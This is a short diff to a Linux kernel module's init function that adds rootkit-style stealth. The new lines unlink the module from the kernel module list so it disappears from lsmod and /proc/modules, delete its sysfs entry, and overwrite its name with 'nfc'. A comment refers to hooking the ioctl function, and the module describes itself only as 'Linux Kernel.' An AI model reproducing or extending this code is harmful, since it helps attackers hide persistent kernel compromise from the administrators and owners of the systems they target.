@@ -210,8 +210,13 @@ static int module_init_fn(void) {
 
 //    printk(KERN_INFO LOG_PREFIX "Hooked `ioctl` function successfully (%p => %p)\n", prototype_ioctl, custom_ioctl);
 
-    list_del_init(&__this_module.list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+//    list_del_init(&__this_module.list);
+    
+    list_del(&THIS_MODULE->list); //lsmod,/proc/modules
+    kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
+    list_del(&THIS_MODULE->mkobj.kobj.entry); // kobj struct list_head entry
+
+    memcpy(THIS_MODULE->name, "nfc\0", 4);
     return 0;
 }
 
@@ -238,3 +243,4 @@ MODULE_DESCRIPTION("Linux Kernel.");
 MODULE_LICENSE("GPL");
 
 MODULE_AUTHOR("buan");
+
